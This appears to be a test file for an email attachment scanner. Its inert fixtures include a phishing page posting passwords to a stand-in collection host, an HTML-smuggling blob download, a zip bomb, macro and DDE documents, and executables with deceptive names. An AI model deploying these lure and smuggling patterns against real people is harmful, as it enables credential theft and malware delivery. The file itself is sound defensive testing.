/**
 * Static attachment inspection: each format, each fact, the limits, and
 * failure containment. Every fixture is built here from inert structures
 * (src/eval/injection/fixtures.ts); every URL is on a reserved test domain.
 */

import { deflateRawSync } from 'zlib';
import { inspectBytes } from '../../../../src/services/attachments';
import { InspectionContext, TextCollector } from '../../../../src/services/attachments/limits';
import {
  AttachmentAnalysisSettings,
  AttachmentInspection,
  DEFAULT_ATTACHMENT_ANALYSIS_SETTINGS,
  FindingKind,
} from '../../../../src/services/attachments/types';
import {
  analyzeName,
  declaredTypeContradicts,
  extensionContradicts,
  sniffType,
} from '../../../../src/services/attachments/sniff';
import { attachmentRiskSignals } from '../../../../src/services/attachments/risk';
import { applyTextBudget, headTail } from '../../../../src/services/attachments/budget';
import {
  base64Lines,
  buildDocx,
  buildGzip,
  buildOle,
  buildPdf,
  buildTar,
  buildZip,
  inertExecutable,
  pngHeader,
} from '../../../../src/eval/injection/fixtures';

const SETTINGS: AttachmentAnalysisSettings = {
  ...DEFAULT_ATTACHMENT_ANALYSIS_SETTINGS,
  enabled: true,
};

function inspect(
  bytes: Buffer | string,
  name = 'file.bin',
  declared?: string,
  settings: Partial<AttachmentAnalysisSettings> = {}
): Promise<AttachmentInspection> {
  return inspectBytes(
    Buffer.isBuffer(bytes) ? bytes : Buffer.from(bytes, 'utf8'),
    name,
    declared,
    InspectionContext.forEmail({ ...SETTINGS, ...settings })
  );
}

function count(inspection: AttachmentInspection, kind: FindingKind): number {
  return inspection.findings.find(f => f.kind === kind)?.count ?? 0;
}

function hosts(inspection: AttachmentInspection, kind: FindingKind): string[] {
  return inspection.findings.find(f => f.kind === kind)?.hosts ?? [];
}

const CREDENTIAL_PAGE = `<!doctype html><html><head><title>Document viewer</title>
<meta http-equiv="refresh" content="30;url=https://bounce.example.net/next">
<script src="https://cdn.example.org/lib.js"></script>
<script>
  var k = atob("aGVsbG8=");
  document.write(unescape("%3Cp%3E"));
  fetch("https://collect.example.net/api", {method: "POST"});
  window.location.replace("https://landing.example.net/");
</script></head>
<body onload="init()">
<img src="https://tracker.example.org/pixel.gif">
<iframe src="https://frame.example.net/"></iframe>
<p>Sign in to view the shared invoice</p>
<form action="https://collect.example.net/login" method="post">
  <input type="email" name="u"><input type="password" name="p">
  <button>View document</button>
</form>
<form action=""><input type="password"></form>
<a href="https://help.example.org/faq">Help</a>
<!-- a comment that is not shown -->
<img src="data:image/png;base64,AAAA">
</body></html>`;

describe('true type identification', () => {
  it.each([
    ['pdf', buildPdf({ pages: [['x']] })],
    ['zip', buildZip([{ name: 'a.txt', data: 'hello' }])],
    ['ole_other', buildOle(['Something'])],
    ['pe_executable', inertExecutable()],
    ['png', pngHeader(1, 1)],
    ['gzip', buildGzip('hello')],
    ['tar', buildTar([{ name: 'a.txt', data: 'hello' }])],
    ['html', Buffer.from('<html><body>hi</body></html>')],
    ['svg', Buffer.from('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"></svg>')],
    ['eml', Buffer.from('From: a@example.com\r\nSubject: hi\r\nTo: b@example.com\r\n\r\nbody')],
    ['text', Buffer.from('just some words')],
    ['rtf', Buffer.from('{\\rtf1\\ansi hello}')],
    ['empty', Buffer.alloc(0)],
    ['unknown', Buffer.from([0, 1, 2, 3, 4, 5, 250, 251, 252])],
  ])('identifies %s from the bytes', (type, bytes) => {
    expect(sniffType(bytes)).toBe(type);
  });

  it('identifies further signatures', () => {
    const lnk = Buffer.alloc(76);
    Buffer.from('4c0000000114020000000000c000000000000046', 'hex').copy(lnk);
    expect(sniffType(lnk)).toBe('shortcut_lnk');
    const iso = Buffer.alloc(0x8010);
    iso.write('CD001', 0x8001, 'latin1');
    expect(sniffType(iso)).toBe('disk_image_iso');
    expect(sniffType(Buffer.from('Rar!\x1a\x07\x00', 'latin1'))).toBe('rar');
    expect(sniffType(Buffer.from([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c]))).toBe('7z');
    expect(sniffType(Buffer.from([0x7f, 0x45, 0x4c, 0x46, 1]))).toBe('elf_executable');
    expect(sniffType(Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 1]))).toBe('macho_executable');
    expect(sniffType(Buffer.from('ITSF\x03\x00', 'latin1'))).toBe('chm');
    expect(sniffType(Buffer.from([0xff, 0xd8, 0xff, 0xe0]))).toBe('jpeg');
    expect(sniffType(Buffer.from('GIF89a\x01\x00\x01\x00', 'latin1'))).toBe('gif');
    const utf16 = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<html><form>', 'utf16le')]);
    expect(sniffType(utf16)).toBe('html');
  });

  it('flags names built to deceive', () => {
    expect(analyzeName('invoice.pdf.exe').flags).toEqual(
      expect.arrayContaining(['double_extension', 'dangerous_extension'])
    );
    expect(analyzeName('invoice‮fdp.exe').flags).toContain('bidi_override');
    expect(analyzeName('report.pdf            .scr').flags).toContain('whitespace_padding');
    expect(analyzeName('readme').flags).toContain('no_extension');
    expect(analyzeName('pay​ment.pdf').flags).toContain('invisible_characters');
    expect(analyzeName('notes.docx').flags).toEqual([]);
  });

  it('judges extension and declared type only when they are specific', () => {
    expect(extensionContradicts('pdf', 'html')).toBe(true);
    expect(extensionContradicts('pdf', 'pdf')).toBe(false);
    expect(extensionContradicts('weird', 'html')).toBe(false);
    expect(declaredTypeContradicts('application/pdf; name=x', 'html')).toBe(true);
    expect(declaredTypeContradicts('application/octet-stream', 'pe_executable')).toBe(false);
  });

  it('reports an HTML file named .pdf as a type mismatch', async () => {
    const result = await inspect('<html><body><p>Invoice</p></body></html>', 'INV-001.pdf', 'application/pdf');
    expect(result.realType).toBe('html');
    expect(result.nameFlags).toEqual(
      expect.arrayContaining(['extension_mismatch', 'declared_type_mismatch'])
    );
  });

  it('flags an executable disguised as a document and never parses it', async () => {
    const result = await inspect(inertExecutable(), 'statement.pdf.exe');
    expect(result).toMatchObject({
      realType: 'pe_executable',
      family: 'executable',
      highRisk: true,
      status: 'not_inspected',
      reason: 'high_risk_type',
    });
    const renamed = await inspect(inertExecutable(), 'statement.pdf');
    expect(renamed.nameFlags).toContain('extension_mismatch');
  });

  it('treats a script extension as high-risk whatever the bytes', async () => {
    const result = await inspect('WScript.Echo("inert")', 'invoice.js');
    expect(result.highRisk).toBe(true);
    expect(result.nameFlags).toContain('dangerous_extension');
  });
});

describe('HTML and SVG', () => {
  it('reports forms, password fields, scripts, redirects and remote resources', async () => {
    const result = await inspect(CREDENTIAL_PAGE, 'invoice.html', 'text/html');
    expect(result.status).toBe('inspected');
    expect(count(result, 'html_forms')).toBe(2);
    expect(hosts(result, 'html_form_posts_to_host')).toEqual(['collect.example.net']);
    expect(count(result, 'html_form_posts_nowhere_visible')).toBe(1);
    expect(count(result, 'html_password_fields')).toBe(2);
    expect(count(result, 'html_script_tags')).toBe(2);
    expect(hosts(result, 'html_remote_scripts')).toEqual(['cdn.example.org']);
    expect(count(result, 'html_inline_event_handlers')).toBe(1);
    expect(count(result, 'html_iframes')).toBe(1);
    expect(count(result, 'html_meta_refresh')).toBe(1);
    expect(count(result, 'html_script_redirect')).toBeGreaterThan(0);
    expect(count(result, 'html_network_requests')).toBeGreaterThan(0);
    expect(count(result, 'html_obfuscation_decoders')).toBeGreaterThanOrEqual(3);
    expect(count(result, 'html_data_uris')).toBe(1);
    expect(hosts(result, 'html_remote_resources')).toEqual(
      expect.arrayContaining(['tracker.example.org', 'frame.example.net'])
    );
    const canonical = result.links.map(l => l.canonical);
    expect(canonical).toEqual(
      expect.arrayContaining([
        'https://collect.example.net/login',
        'https://bounce.example.net/next',
        'https://help.example.org/faq',
        'https://landing.example.net/',
      ])
    );
    expect(result.text).toContain('Sign in to view the shared invoice');
    expect(result.text).not.toContain('a comment that is not shown');
    expect(result.text).not.toContain('atob');
  });

  it('decodes entities in attributes and honours quotes containing ">"', async () => {
    const result = await inspect(
      '<html><form data-x="a>b" action="https&#58;//collect.example.net/x"><input type=\'password\'></form></html>'
    );
    expect(hosts(result, 'html_form_posts_to_host')).toEqual(['collect.example.net']);
  });

  it('finds large base64 blocks and file-smuggling markers', async () => {
    const blob = 'QUJD'.repeat(800);
    const result = await inspect(
      `<html><script>var b = new Blob([atob("${blob}")]); var u = URL.createObjectURL(b); a.download = "x.iso";</script></html>`
    );
    expect(count(result, 'html_large_base64')).toBe(1);
    expect(count(result, 'html_smuggling_markers')).toBeGreaterThanOrEqual(2);
  });

  it('inspects SVG with script and links', async () => {
    const result = await inspect(
      '<svg xmlns="http://www.w3.org/2000/svg" onload="go()"><script>window.location="https://svg.example.net/"</script><a xlink:href="https://svg-link.example.net/"><text>Open</text></a></svg>',
      'fax.svg'
    );
    expect(result.realType).toBe('svg');
    expect(count(result, 'html_script_tags')).toBe(1);
    expect(count(result, 'html_inline_event_handlers')).toBe(1);
    expect(result.links.map(l => l.canonical)).toContain('https://svg-link.example.net/');
  });

  it('stays linear on pathological markup', async () => {
    const started = Date.now();
    const result = await inspect(`<html>${'<a "'.repeat(200_000)}<form action="https://late.example.net/"><input type=password></form>`);
    expect(Date.now() - started).toBeLessThan(5000);
    expect(['inspected', 'partial', 'failed']).toContain(result.status);
  });

  it('scans the tail of an oversized page (padding cannot hide the form)', async () => {
    const padding = `<p>${'x'.repeat(5 * 1024 * 1024)}</p>`;
    const result = await inspect(
      `<html>${padding}<form action="https://tail.example.net/"><input type="password"></form></html>`
    );
    expect(result.limitsHit).toContain('scan_size');
    expect(result.status).toBe('partial');
    expect(hosts(result, 'html_form_posts_to_host')).toEqual(['tail.example.net']);
  });
});

describe('PDF', () => {
  it('reads pages, text, links, JavaScript and actions, through name escapes and compression', async () => {
    const result = await inspect(
      buildPdf({
        pages: [['Invoice INV-2201 for consulting services rendered in October, total due 1,200.00'], ['Page two']],
        links: ['https://pay.example.net/invoice'],
        javascript: true,
        obfuscateNames: true,
        compress: true,
        launch: true,
        embeddedFile: true,
        submitTo: 'https://forms.example.net/submit',
      }),
      'invoice.pdf',
      'application/pdf'
    );
    expect(result.realType).toBe('pdf');
    expect(count(result, 'pdf_pages')).toBe(2);
    expect(count(result, 'pdf_javascript')).toBeGreaterThan(0);
    expect(count(result, 'pdf_open_action')).toBe(1);
    expect(count(result, 'pdf_launch_action')).toBe(1);
    expect(count(result, 'pdf_embedded_files')).toBe(1);
    expect(hosts(result, 'pdf_submit_form')).toEqual(['forms.example.net']);
    expect(count(result, 'pdf_uri_actions')).toBe(1);
    expect(count(result, 'pdf_link_annotations')).toBe(1);
    expect(result.links.map(l => l.canonical)).toContain('https://pay.example.net/invoice');
    expect(result.text).toContain('Invoice INV-2201');
    expect(result.text).toContain('Page two');
    expect(count(result, 'pdf_little_text_with_links_or_images')).toBe(0);
  });

  it('flags a document that is almost only a link or an image', async () => {
    const linkOnly = await inspect(buildPdf({ pages: [[]], links: ['https://lure.example.net/'] }));
    expect(count(linkOnly, 'pdf_little_text_with_links_or_images')).toBe(1);
    const imageOnly = await inspect(buildPdf({ pages: [['Scan']], images: 1 }));
    expect(count(imageOnly, 'pdf_images')).toBe(1);
    expect(count(imageOnly, 'pdf_little_text_with_links_or_images')).toBe(1);
  });

  it('reads annotations hidden inside compressed object streams', async () => {
    const result = await inspect(buildPdf({ pages: [['hello']], links: ['https://objstm.example.net/'], objectStream: true }));
    expect(count(result, 'pdf_object_streams')).toBe(1);
    expect(result.links.map(l => l.canonical)).toContain('https://objstm.example.net/');
  });

  it('reports encryption and stops short of the content', async () => {
    const result = await inspect(buildPdf({ pages: [['secret text']], encrypt: true }));
    expect(count(result, 'pdf_encrypted')).toBe(1);
    expect(result.status).toBe('partial');
    expect(result.reason).toBe('encrypted');
    expect(result.text).toBeUndefined();
  });

  it('decodes ASCIIHex and ASCII85 filters and UTF-16 strings', async () => {
    const content = 'BT (Hex filtered text) Tj ET';
    const hex = Buffer.from(content).toString('hex');
    const pdf = `%PDF-1.4\n1 0 obj\n<< /Type /Page >>\nendobj\n2 0 obj\n<< /Length ${hex.length + 1} /Filter /ASCIIHexDecode >>\nstream\n${hex}>\nendstream\nendobj\n3 0 obj\n<< /Length 30 /Filter /A85 >>\nstream\n<~6#pUO9Q+J#~>\nendstream\nendobj\n4 0 obj\n<< /Length 20 >>\nstream\nBT <FEFF00480069> Tj ET\nendstream\nendobj\n%%EOF\n`;
    const result = await inspect(pdf);
    expect(result.text).toContain('Hex filtered text');
    expect(result.text).toContain('Hi');
  });

  it('counts text in fonts it cannot decode instead of guessing', async () => {
    const pdf = `%PDF-1.4\n1 0 obj\n<< /Length 40 >>\nstream\nBT <0001000200030004000500060007> Tj ET\nendstream\nendobj\n%%EOF\n`;
    const result = await inspect(pdf);
    expect(count(result, 'pdf_text_undecodable')).toBeGreaterThan(0);
  });

  it('handles TJ arrays, escapes and comments in content streams', async () => {
    const pdf = `%PDF-1.4\n1 0 obj\n<< /Length 80 >>\nstream\n% comment\nBT [(Pay) -300 (now\\051 \\(urgent\\)) 12 (!)] TJ T* (line\\\ntwo) ' ET\nendstream\nendobj\n%%EOF\n`;
    const result = await inspect(pdf);
    expect(result.text).toContain('Pay now) (urgent)');
    expect(result.text).toContain('linetwo');
  });

  it('survives truncated and garbage streams', async () => {
    const broken = `%PDF-1.4\n1 0 obj\n<< /Length 9 /Filter /FlateDecode >>\nstream\nnot-zlib-data\nendstream\nendobj\n2 0 obj\n<< /Filter /LZWDecode >>\nstream\nxx\nendstream\nendobj\n3 0 obj << /Length 5 >>\nstream\nBT (unterminated`;
    const result = await inspect(broken);
    expect(['inspected', 'partial']).toContain(result.status);
    expect(count(result, 'pdf_streams_undecodable')).toBe(2);
  });
});

describe('Office Open XML', () => {
  it('reports macros, remote templates, DDE, embedded objects, hyperlinks and text', async () => {
    const result = await inspect(
      buildDocx({
        paragraphs: ['Please enable editing to view this protected document.', 'Second paragraph'],
        hyperlinks: ['https://docs.example.net/view'],
        macro: true,
        remoteTemplate: 'https://templates.example.net/t.dotm',
        dde: true,
        embeddings: 2,
        deflate: true,
      }),
      'statement.docm'
    );
    expect(result.realType).toBe('docm');
    expect(count(result, 'ooxml_macros')).toBe(1);
    expect(hosts(result, 'ooxml_external_template')).toEqual(['templates.example.net']);
    expect(count(result, 'ooxml_dde_fields')).toBe(1);
    expect(count(result, 'ooxml_embedded_objects')).toBe(2);
    expect(count(result, 'ooxml_hyperlinks')).toBe(1);
    expect(result.links.map(l => l.canonical)).toEqual(
      expect.arrayContaining(['https://docs.example.net/view', 'https://templates.example.net/t.dotm'])
    );
    expect(result.text).toContain('Please enable editing');
    expect(result.text).toContain('Second paragraph');
  });

  it('identifies xlsx, pptx and a disguised macro document', async () => {
    const xlsx = buildZip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'xl/workbook.xml', data: '<workbook/>' },
      { name: 'xl/sharedStrings.xml', data: '<sst><si><t>Remittance total</t></si></sst>' },
      {
        name: 'xl/_rels/workbook.xml.rels',
        data: '<Relationships><Relationship Type="x/oleObject" Target="\\\\share.example.net\\x\\y.bin" TargetMode="External"/><Relationship Type="x/image" Target="https://img.example.net/a.png" TargetMode="External"/></Relationships>',
      },
      { name: 'xl/externalLinks/externalLink1.xml', data: '<externalLink><ddeLink ddeService="x"/></externalLink>' },
    ]);
    const x = await inspect(xlsx, 'book.xlsx');
    expect(x.realType).toBe('xlsx');
    expect(x.text).toContain('Remittance total');
    expect(count(x, 'ooxml_dde_fields')).toBe(1);
    expect(hosts(x, 'ooxml_unc_paths')).toEqual(['share.example.net']);
    expect(hosts(x, 'ooxml_external_image')).toEqual(['img.example.net']);

    const pptx = buildZip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'ppt/presentation.xml', data: '<p/>' },
      { name: 'ppt/slides/slide1.xml', data: '<p:sld><a:p><a:r><a:t>Slide text</a:t></a:r></a:p></p:sld>' },
      { name: 'ppt/vbaProject.bin', data: 'placeholder' },
    ]);
    const p = await inspect(pptx, 'deck.pptx');
    expect(p.realType).toBe('pptm');
    expect(p.text).toContain('Slide text');

    const disguised = await inspect(buildDocx({ paragraphs: ['x'], macro: true }), 'invoice.docx');
    expect(disguised.realType).toBe('docm');
    expect(count(disguised, 'ooxml_macros')).toBe(1);
  });

  it('identifies a JAR and does not open it', async () => {
    const jar = buildZip([{ name: 'META-INF/MANIFEST.MF', data: 'Manifest-Version: 1.0' }]);
    const result = await inspect(jar, 'invoice.jar');
    expect(result).toMatchObject({ realType: 'jar', highRisk: true, status: 'not_inspected' });
  });
});

describe('legacy OLE', () => {
  it('detects VBA macro storages in a legacy Word document', async () => {
    const result = await inspect(buildOle(['WordDocument', 'Macros', 'VBA', '_VBA_PROJECT']), 'old.doc');
    expect(result.realType).toBe('ole_doc');
    expect(count(result, 'ole_macros')).toBeGreaterThan(0);
    expect(count(result, 'ole_legacy_not_inspected')).toBe(1);
  });

  it('identifies xls, ppt, msg, msi, encrypted OOXML and embedded objects', async () => {
    const xls = await inspect(buildOle(['Workbook', '_VBA_PROJECT_CUR', 'VBA']));
    expect(xls.realType).toBe('ole_xls');
    expect(count(xls, 'ole_macros')).toBeGreaterThan(0);
    expect((await inspect(buildOle(['PowerPoint Document']))).realType).toBe('ole_ppt');
    const msg = await inspect(buildOle(['__substg1.0_0037001F', '__properties_version1.0']));
    expect(msg).toMatchObject({ realType: 'ole_msg', family: 'email', status: 'partial' });
    const msi = await inspect(
      buildOle(['x'], { rootClsid: Buffer.from('84100c0000000000c000000000000046', 'hex') })
    );
    expect(msi).toMatchObject({ realType: 'msi', highRisk: true, status: 'not_inspected' });
    const encrypted = await inspect(buildOle(['EncryptionInfo', 'EncryptedPackage']));
    expect(encrypted).toMatchObject({ realType: 'ooxml_encrypted', reason: 'encrypted' });
    const objects = await inspect(buildOle(['WordDocument', 'ObjectPool', '\u0001Ole10Native', 'Equation Native']));
    expect(count(objects, 'ole_embedded_objects')).toBe(2);
    expect(count(objects, 'ole_equation_editor')).toBe(1);
  });

  it('fails safely on a corrupt directory', async () => {
    const bad = buildOle(['WordDocument']);
    bad.writeUInt32LE(0x7fffff, 0x30); // directory sector far outside the file
    const result = await inspect(bad);
    expect(result).toMatchObject({ status: 'failed', reason: 'malformed' });
  });
});

describe('RTF', () => {
  it('reports embedded objects and hyperlinks', async () => {
    const result = await inspect(
      '{\\rtf1 {\\object\\objemb {\\*\\objclass Equation.3}{\\*\\objdata 0102}} {\\field{\\*\\fldinst HYPERLINK "https://rtf.example.net/"}}}'
    );
    expect(count(result, 'rtf_embedded_objects')).toBe(1);
    expect(count(result, 'rtf_equation_editor')).toBe(1);
    expect(result.links.map(l => l.canonical)).toContain('https://rtf.example.net/');
  });
});

describe('archives', () => {
  it('lists entries with real types and flags executables, scripts and nested archives', async () => {
    const zip = buildZip([
      { name: 'invoice.pdf.exe', data: inertExecutable(), deflate: true },
      { name: 'run.js', data: 'WScript.Echo(1)' },
      { name: 'page.html', data: '<form action="https://zip.example.net/"><input type="password"></form>' },
      { name: 'inner.zip', data: buildZip([{ name: 'deep.txt', data: 'https://deep.example.net/' }]) },
      { name: 'secret.pdf', data: 'x', encrypted: true },
    ]);
    const result = await inspect(zip, 'docs.zip');
    expect(result.realType).toBe('zip');
    expect(count(result, 'archive_entries')).toBe(5);
    expect(count(result, 'archive_encrypted_entries')).toBe(1);
    expect(count(result, 'archive_nested_archives')).toBe(1);
    expect(count(result, 'archive_high_risk_entries')).toBe(2);
    const children = result.children ?? [];
    expect(children.map(c => c.inspection.realType)).toEqual([
      'pe_executable',
      'text',
      'html',
      'zip',
      'unknown',
    ]);
    expect(children[4].inspection.reason).toBe('encrypted');
    expect(children[3].inspection.children?.[0].inspection.links[0].canonical).toBe(
      'https://deep.example.net/'
    );
    expect(attachmentRiskSignals([{ filename: 'docs.zip', contentType: 'application/zip', size: 1, analysis: result }])).toEqual([
      'credential_form',
      'disguised_executable',
    ]);
  });

  it('stops at the entry limit and discloses it', async () => {
    const files = Array.from({ length: 30 }, (_, i) => ({ name: `f${i}.txt`, data: 'x' }));
    const result = await inspect(buildZip(files), 'many.zip', undefined, { maxArchiveEntries: 10 });
    expect(result.children).toHaveLength(10);
    expect(result.childrenTotal).toBe(30);
    expect(result.limitsHit).toContain('entry_count');
    expect(result.status).toBe('partial');
  });

  it('never inflates past the per-entry bound, whatever the entry claims (zip bomb)', async () => {
    const bomb = buildZip([
      { name: 'bomb.txt', data: Buffer.alloc(40 * 1024 * 1024), deflate: true, declaredSize: 100 },
    ]);
    expect(bomb.length).toBeLessThan(100_000);
    const result = await inspect(bomb, 'bomb.zip');
    expect(result.limitsHit).toEqual(expect.arrayContaining(['entry_size']));
    expect(result.children?.[0].inspection.status).toBe('not_inspected');
  });

  it('stops at the email-wide decompression budget', async () => {
    const files = Array.from({ length: 4 }, (_, i) => ({
      name: `part${i}.txt`,
      data: Buffer.alloc(1024 * 1024, 0x41),
      deflate: true,
    }));
    const result = await inspect(buildZip(files), 'parts.zip', undefined, {
      maxUncompressedBytes: 2 * 1024 * 1024 + 100,
    });
    expect(result.limitsHit).toContain('total_uncompressed');
    expect(result.children?.filter(c => c.inspection.reason === 'budget_exhausted').length).toBeGreaterThan(0);
  });

  it('detects overlapping entries and does not decompress them', async () => {
    const zip = buildZip([{ name: 'a.txt', data: 'hello world', deflate: true }]);
    // Duplicate the central record so two entries share one data range
    const eocd = zip.length - 22;
    const dirOffset = zip.readUInt32LE(eocd + 16);
    const dirSize = zip.readUInt32LE(eocd + 12);
    const record = zip.subarray(dirOffset, dirOffset + dirSize);
    const end = Buffer.from(zip.subarray(eocd));
    end.writeUInt16LE(2, 8);
    end.writeUInt16LE(2, 10);
    end.writeUInt32LE(dirSize * 2, 12);
    const overlapped = Buffer.concat([zip.subarray(0, dirOffset), record, record, end]);
    const result = await inspect(overlapped, 'overlap.zip');
    expect(count(result, 'archive_overlapping_entries')).toBe(1);
    expect(result.children?.every(c => c.inspection.status === 'not_inspected')).toBe(true);
  });

  it('follows nesting only to the depth limit', async () => {
    let nested = buildZip([{ name: 'core.txt', data: 'bottom' }]);
    for (let i = 0; i < 5; i++) nested = buildZip([{ name: `level${i}.zip`, data: nested }]);
    const result = await inspect(nested, 'nest.zip', undefined, { maxDepth: 2 });
    let node: AttachmentInspection | undefined = result;
    let depth = 0;
    while (node?.children?.[0]) {
      node = node.children[0].inspection;
      depth++;
    }
    expect(depth).toBeLessThanOrEqual(3);
    const hit = JSON.stringify(result);
    expect(hit).toContain('nesting_depth');
  });

  it('reads gzip and tar', async () => {
    const result = await inspect(
      buildGzip(buildTar([{ name: 'notes.txt', data: 'see https://tar.example.net/' }, { name: 'a.exe', data: inertExecutable() }])),
      'bundle.tar.gz'
    );
    expect(result.realType).toBe('gzip');
    const tar = result.children?.[0].inspection;
    expect(tar?.realType).toBe('tar');
    expect(tar?.children?.map(c => c.claimedName)).toEqual(['notes.txt', 'a.exe']);
    expect(count(tar as AttachmentInspection, 'archive_high_risk_entries')).toBe(1);
  });

  it('identifies formats it does not open', async () => {
    const rar = await inspect(Buffer.from('Rar!\x1a\x07\x01\x00rest', 'latin1'), 'a.rar');
    expect(rar).toMatchObject({ realType: 'rar', status: 'not_inspected', reason: 'unsupported' });
  });

  it('reports a zip without a central directory as malformed', async () => {
    const result = await inspect(Buffer.from('PK\x03\x04garbage-without-directory', 'latin1'), 'x.zip');
    expect(result).toMatchObject({ status: 'failed', reason: 'malformed' });
  });
});

describe('attached emails', () => {
  it('parses an attached email and inspects its attachments one level down', async () => {
    const inner = [
      'From: billing@vendor.example.net',
      'To: someone@example.com',
      'Subject: Attached statement',
      'MIME-Version: 1.0',
      'Content-Type: multipart/mixed; boundary="in"',
      '',
      '--in',
      'Content-Type: text/plain',
      '',
      'Open https://inner.example.net/view to review.',
      '--in',
      'Content-Type: text/html; name="view.html"',
      'Content-Disposition: attachment; filename="view.html"',
      'Content-Transfer-Encoding: base64',
      '',
      base64Lines(Buffer.from('<form action="https://inner-form.example.net/"><input type="password"></form>')),
      '--in--',
      '',
    ].join('\r\n');
    const result = await inspect(inner, 'statement.eml', 'message/rfc822');
    expect(result.realType).toBe('eml');
    expect(result.claimedSubject).toBe('Attached statement');
    expect(result.text).toContain('to review');
    expect(result.links.map(l => l.canonical)).toContain('https://inner.example.net/view');
    expect(count(result, 'email_attachments')).toBe(1);
    expect(result.children?.[0].inspection.realType).toBe('html');
  });

  it('stops at the depth limit for nested emails', async () => {
    const inner = 'From: a@example.com\r\nSubject: x\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary="q"\r\n\r\n--q\r\nContent-Type: text/plain\r\n\r\nhi\r\n--q\r\nContent-Type: text/plain; name="a.txt"\r\nContent-Disposition: attachment; filename="a.txt"\r\n\r\nattached\r\n--q--\r\n';
    const result = await inspect(inner, 'x.eml', undefined, { maxDepth: 0 });
    expect(result.limitsHit).toContain('nesting_depth');
  });
});

describe('images', () => {
  it('reports type and dimensions only', async () => {
    const png = await inspect(pngHeader(1200, 300), 'qr.png');
    expect(png).toMatchObject({ realType: 'png', family: 'image', dimensions: { width: 1200, height: 300 } });
    expect(png.text).toBeUndefined();
    const gif = await inspect(Buffer.from('GIF89a\x10\x00\x20\x00', 'latin1'));
    expect(gif.dimensions).toEqual({ width: 16, height: 32 });
    const jpeg = Buffer.from('ffd8ffe000104a46494600010100000100010000ffc0000b080040008001011100', 'hex');
    expect((await inspect(jpeg)).dimensions).toEqual({ width: 128, height: 64 });
  });
});

describe('failure containment', () => {
  it('turns an expired deadline into a fixed timeout reason', async () => {
    const ctx = InspectionContext.forEmail({ ...SETTINGS, timeBudgetMs: 500 }, Date.now() - 10_000);
    const result = await inspectBytes(Buffer.from(CREDENTIAL_PAGE), 'a.html', undefined, ctx);
    expect(result).toMatchObject({ status: 'failed', reason: 'timeout', realType: 'html' });
  });

  it('does not inspect a file over the size limit', async () => {
    const result = await inspect(buildPdf({ pages: [['x']] }), 'big.pdf', undefined, { maxAttachmentBytes: 100 });
    expect(result).toMatchObject({ status: 'not_inspected', reason: 'too_large', realType: 'pdf' });
  });

  it('never throws on random or truncated bytes of any format', async () => {
    const seeds = [
      buildPdf({ pages: [['x']], links: ['https://a.example.net/'], compress: true }),
      buildDocx({ paragraphs: ['x'], deflate: true }),
      buildOle(['WordDocument', 'Macros']),
      buildZip([{ name: 'a.txt', data: 'x', deflate: true }]),
      buildGzip('hello'),
      buildTar([{ name: 'a', data: 'b' }]),
      Buffer.from(CREDENTIAL_PAGE),
    ];
    let state = 12345;
    const rand = (): number => {
      state = (state * 1103515245 + 12345) & 0x7fffffff;
      return state;
    };
    for (const seed of seeds) {
      for (let round = 0; round < 25; round++) {
        const mutated = Buffer.from(seed.subarray(0, Math.max(8, rand() % seed.length)));
        for (let k = 0; k < 6; k++) mutated[rand() % mutated.length] = rand() & 0xff;
        const result = await inspect(mutated, 'fuzz.bin');
        expect(['inspected', 'partial', 'not_inspected', 'failed']).toContain(result.status);
      }
    }
  });

  it('handles a deflate stream that is not valid', async () => {
    const zip = buildZip([{ name: 'a.txt', data: 'hello', deflate: true }]);
    const start = 30 + 'a.txt'.length;
    const corrupt = Buffer.from(zip);
    const body = deflateRawSync(Buffer.from('hello'));
    for (let i = 0; i < body.length; i++) corrupt[start + i] = 0xff;
    const result = await inspect(corrupt, 'bad.zip');
    expect(result.children?.[0].inspection.reason).toBe('malformed');
  });
});

describe('text budget', () => {
  it('keeps head and tail and marks the cut', () => {
    const text = `HEAD${'m'.repeat(1000)}TAIL`;
    const cut = headTail(text, 100);
    expect(cut.text.startsWith('HEAD')).toBe(true);
    expect(cut.text.endsWith('TAIL')).toBe(true);
    expect(cut.elided).toBe(text.length - 100);
    expect(cut.text).toContain('disclosed under ELISIONS');
  });

  it('shares the total fairly so many padded files cannot starve the payload', () => {
    const make = (text: string): AttachmentInspection => ({
      status: 'inspected',
      realType: 'text',
      family: 'text',
      highRisk: false,
      nameFlags: [],
      findings: [],
      links: [],
      linksTotal: 0,
      text,
      textChars: text.length,
      limitsHit: [],
      durationMs: 0,
    });
    const padding = Array.from({ length: 9 }, () => make('p'.repeat(10_000)));
    const payload = make(`PAYLOAD-START ${'q'.repeat(10_000)} PAYLOAD-END`);
    const short = make('short note');
    applyTextBudget([...padding, payload, short], 4000, 10_000);
    expect(short.text).toBe('short note');
    expect(payload.text).toContain('PAYLOAD-START');
    expect(payload.text).toContain('PAYLOAD-END');
    expect(payload.textShownElided).toBeGreaterThan(0);
    const shown = [...padding, payload, short].reduce((n, i) => n + (i.text ?? '').replace(/\n\[\.\.\. \d+ characters elided here - disclosed under ELISIONS \.\.\.\]\n/, '').length, 0);
    expect(shown).toBeLessThanOrEqual(10_000);
  });

  it('collects head and rolling tail of very long text', () => {
    const collector = new TextCollector();
    collector.add('A'.repeat(100_000));
    collector.add('THE-END');
    const { text, chars } = collector.result();
    expect(chars).toBe(100_007);
    expect(text.endsWith('THE-END')).toBe(true);
    expect(text).toContain('characters not kept');
  });
});
